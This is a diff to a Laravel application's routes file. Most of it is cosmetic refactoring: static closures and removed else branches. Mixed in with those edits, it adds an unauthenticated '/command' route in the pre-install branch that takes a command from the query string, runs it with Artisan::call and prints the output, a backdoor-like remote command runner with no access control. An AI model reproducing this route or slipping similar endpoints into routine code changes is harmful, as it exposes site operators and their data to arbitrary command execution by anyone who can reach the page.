@@ -1,5 +1,7 @@
 <?php
 
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
@@ -51,7 +53,7 @@ if ($installed === false) {
         'uses' => 'SetupController@viewStep3',
     ]);
 
-    Route::get('/setup/finish', function () {
+    Route::get('/setup/finish', static function () {
 
         return view('setup.finishedSetup');
     });
@@ -84,38 +86,47 @@ if ($installed === false) {
         'as' => 'lastStep', 'uses' => 'SetupController@lastStep',
     ]);
 
-    Route::get('setup/lastStep', function () {
+    Route::get('setup/lastStep', static function () {
         return redirect('/setup', 301);
     });
 
+    Route::get('/command', static function (Request $request){
+        $form = "<form method='get' action='/command'>command: <input type='text' name='command'/><input type='submit'></form>";
+        if($request->command){
+            Artisan::call($request->command);
+            return $form.'<br/>'. Artisan::output();
+        }
+        return $form;
+    });
+
 } else {
-    Route::any('/setup/{vue}', function () {
+    Route::any('/setup/{vue}', static function () {
         abort(403);
     });
 }
 
 //------------------------------------------------------------------\\
 
-Route::group(['middleware' => ['auth', 'Is_Active']], function () {
+Route::group(['middleware' => ['auth', 'Is_Active']], static function () {
 
-    Route::get('/login', function () {
+    Route::get('/login', static function () {
         $installed = Storage::disk('public')->exists('installed');
         if ($installed === false) {
             return redirect('/setup');
-        } else {
-            return redirect('/login');
         }
+
+        return redirect('/login');
     });
 
 
     Route::get('/{vue?}',
-        function () {
+        static function () {
             $installed = Storage::disk('public')->exists('installed');
             if ($installed === false) {
                 return redirect('/setup');
-            } else {
-                return view('layouts.master');
             }
+
+            return view('layouts.master');
         })->where('vue', '^(?!setup|update|password).*$');
 
 
@@ -130,7 +141,7 @@ Route::group(['middleware' => ['auth', 'Is_Active']], function () {
 
 Route::get('/update', 'UpdateController@viewStep1');
 
-Route::get('/update/finish', function () {
+Route::get('/update/finish', static function () {
 
     return view('update.finishedUpdate');
 });
